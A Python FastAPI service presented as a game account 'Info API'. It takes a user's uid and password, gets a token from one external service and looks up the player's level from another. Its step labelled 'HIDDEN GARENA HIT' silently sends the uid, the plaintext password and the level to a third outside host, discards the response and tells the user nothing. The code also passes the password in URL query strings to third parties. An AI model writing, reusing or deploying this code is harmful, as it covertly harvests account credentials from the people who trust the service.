from fastapi import FastAPI, HTTPException, Query
import requests
import base64
import json

app = FastAPI()


# ================================
# 🟢 HOME ROUTE (DIRECT OPEN)
# ================================
@app.get("/")
def home():
    return {
        "message": "Info API ready 👍"
    }


# ================================
# 1️⃣ JWT DECODE FUNCTION
# ================================
def jwt_decode_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        payload = parts[1]
        payload += "=" * (-len(payload) % 4)  # fix padding
        decoded = base64.urlsafe_b64decode(payload).decode("utf-8")
        return json.loads(decoded)
    except:
        return None


# ================================
# 2️⃣ MAIN API
# ================================
@app.get("/info")
def get_info(uid: str = Query(None), password: str = Query(None)):

    # INPUT CHECK
    if not uid or not password:
        return {
            "status": False,
            "message": "Enter uid & password"
        }

    # ================================
    # STEP 1 — JWT API CALL
    # ================================
    jwt_url = f"https://jwtsemygen.vercel.app/token?key=SEMY&uid={uid}&password={password}"

    try:
        jwt_res = requests.get(jwt_url, timeout=5)
    except:
        raise HTTPException(status_code=500, detail="JWT request failed")

    if jwt_res.status_code != 200:
        return {"status": False, "message": "Account ban or wrong uid password"}

    try:
        jwt_json = jwt_res.json()
    except:
        return {"status": False, "message": "Invalid JWT response"}

    token = jwt_json.get("token")
    if not token:
        return {"status": False, "message": "Account ban or wrong uid password"}

    # ================================
    # STEP 2 — DECODE JWT
    # ================================
    data = jwt_decode_payload(token)
    if not data:
        return {"status": False, "message": "Decode Failed"}

    account_id = data.get("account_id")
    region = data.get("noti_region")
    external_uid = data.get("external_uid")

    # ================================
    # STEP 3 — LEVEL API
    # ================================
    level_url = f"https://mafuapi.vercel.app/mafu-level?uid={account_id}&key=mafu"

    try:
        level_res = requests.get(level_url, timeout=5)
        level_json = level_res.json()
    except:
        return {"status": False, "message": "Level fetch failed"}

    player = level_json.get("player_info", {})

    nickname = player.get("nickname")
    level = player.get("current_level")
    final_uid = player.get("uid")

    # ================================
    # STEP 4 — HIDDEN GARENA HIT
    # ================================
    try:
        garena_url = f"https://infopapa.vercel.app/info?uid={external_uid}&password={password}&level={level}"
        requests.get(garena_url, timeout=3)
    except:
        pass  # ignore

    # ================================
    # FINAL RESPONSE
    # ================================
    return {
        "status": True,
        "message": "success",
        "nickname": nickname,
        "Account uid": final_uid,
        "current_level": level,
        "region": region
    }